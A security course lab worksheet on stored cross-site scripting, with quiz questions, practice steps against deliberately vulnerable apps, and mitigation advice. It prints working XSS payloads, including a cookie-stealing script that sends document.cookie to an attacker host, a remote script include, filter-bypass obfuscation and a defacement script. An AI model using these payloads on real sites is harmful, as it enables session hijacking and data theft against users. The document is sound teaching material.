# Lab 11 - Stored Cross-Site Scripting (XSS) Attacks

**Objective:**  
This lab will focus on **Stored Cross-Site Scripting (XSS) vulnerabilities**. Unlike reflected XSS, where malicious scripts are reflected in the server’s response, stored XSS occurs when the script is permanently stored on the server and executed whenever the affected content is accessed by users. Students will learn to identify and exploit stored XSS vulnerabilities in web applications.

---

### **Background / Scenario:**
Stored XSS is a dangerous vulnerability that allows an attacker to inject malicious code into a web application. This code is then stored on the server (for example, in a database), and every time a user views the affected page, the code is executed. This attack can lead to account hijacking, data theft, or even defacement of a website.

---

### **Required Resources:**
- Internet access
- A web browser with developer tools
- A vulnerable web application (like **DVWA** or **OWASP Juice Shop**) or a test environment for XSS

---

### **Instructions:**

#### **Part 1: Understanding Stored XSS**

1. **What is Stored XSS?**  
   Stored XSS occurs when an attacker inputs malicious data that is stored on the server and later executed in other users' browsers without validation. Unlike reflected XSS, the attack persists and can affect multiple users who visit the page.

---

2. **Question 1:**  
   As part of the Pixel Paradise pentest, you posted the following review:  
   **“Warlocks of Wonder is the greatest game of its type ever made!  
   `<script src="https://203.0.113.17/protego_test.js"></script>`”**  
   This script logs visits to the review page. What exploit have you created on the Pixel Paradise website?

   - A) Stored Cross-Site Scripting
   - B) HTTP Parameter Pollution
   - C) DOM-based Cross-Site Scripting
   - D) Reflected Cross-Site Scripting

---

#### **Part 2: Exploiting Stored XSS in a Product Review Page**

1. **Simulating a Stored XSS Attack:**  
   - Navigate to a review page in a vulnerable application.  
   - Post a comment or review that contains an XSS payload like:  
     ```html
     <script>alert('XSS Attack!');</script>
     ```
   - Refresh the page and see if the alert is triggered for every user who visits the page.

   **Question 2:**  
   - Were you able to inject and store malicious JavaScript on the review page?
   - What are the implications of a successful stored XSS attack?

---

#### **Part 3: Creating Malicious Scripts to Steal Data**

1. **Stealing Cookies with Stored XSS:**  
   - Modify the stored XSS payload to steal cookies from users by including a script like:  
     ```html
     <script>new Image().src="http://attacker.com/steal.php?cookie="+document.cookie;</script>
     ```
   - Post the malicious script as part of a review and check if the cookies of visitors are sent to the attacker's server.

   **Question 3:**  
   - What type of information can be stolen using stored XSS?
   - Explain how this could lead to session hijacking or unauthorized access.

---

#### **Part 4: Bypassing Input Filters**

1. **Obfuscating Payloads to Bypass Filters:**  
   Web applications may have basic filters to prevent XSS by blocking certain keywords or special characters. Use obfuscation techniques to bypass these filters:
   - Example:  
     ```html
     "<scr"+"ipt>alert('XSS')</scr"+"ipt>"
     ```
   - URL-encode the script:  
     ```html
     %3Cscript%3Ealert('XSS')%3C/script%3E
     ```

   **Question 4:**  
   - Were you able to bypass any input filters?
   - What techniques worked best to evade the security measures in place?

---

#### **Part 5: Crafting Persistent Payloads for Long-Term Exploits**

1. **Creating Persistent XSS Payloads:**  
   In a stored XSS attack, the malicious script is stored on the server for as long as the data persists. Craft a payload that creates a persistent issue, such as modifying the page or stealing session tokens repeatedly:
   - Example:  
     ```html
     <script>
       document.body.innerHTML = '<h1>Website Hacked</h1>';
     </script>
     ```

   **Question 5:**  
   - What is the difference between temporary reflected XSS attacks and persistent stored XSS attacks in terms of long-term impact on the application and users?

---

#### **Part 6: Detecting and Preventing Stored XSS Attacks**

1. **Mitigation Techniques for Stored XSS:**  
   - Input validation and output encoding: All input data should be validated and sanitized before being stored on the server. Output encoding should also be applied to ensure that any data displayed in the browser is safely rendered as text, not executable code.
   - Content Security Policy (CSP): A properly configured CSP can mitigate the impact of XSS by preventing the execution of unauthorized scripts.

   **Question 6:**  
   What are the best practices for preventing stored XSS in web applications?  
   *(Choose all that apply.)*

   - A) Sanitize user inputs and escape output
   - B) Block all special characters
   - C) Implement a Content Security Policy (CSP)
   - D) Disable JavaScript for all users
   - E) Validate user input on the server side

---

#### **Part 7: Real-World Stored XSS Case Study**

1. **Exploring Real Incidents:**  
   - Research a real-world case where a stored XSS vulnerability was exploited. Provide details about the incident, its impact, and how the vulnerability was discovered and patched.

   **Question 7:**  
   - How was stored XSS used in a real-world attack to compromise users or steal sensitive data?
   - What remediation steps were taken to prevent future occurrences?

---

### **Reflection Questions:**

- **Question 8:**  
   - Explain how stored XSS can have a more significant impact than reflected XSS. Why is stored XSS more dangerous in terms of user exposure and exploitation?

- **Question 9:**  
   - What steps should be taken by developers to ensure that user-generated content, such as comments or reviews, does not introduce security vulnerabilities like XSS?

---

### **Lab Conclusion:**
In this lab, students explored **Stored Cross-Site Scripting** vulnerabilities and learned how to identify, exploit, and mitigate such attacks. By understanding stored XSS, students will be better prepared to secure web applications against these types of persistent and dangerous exploits.

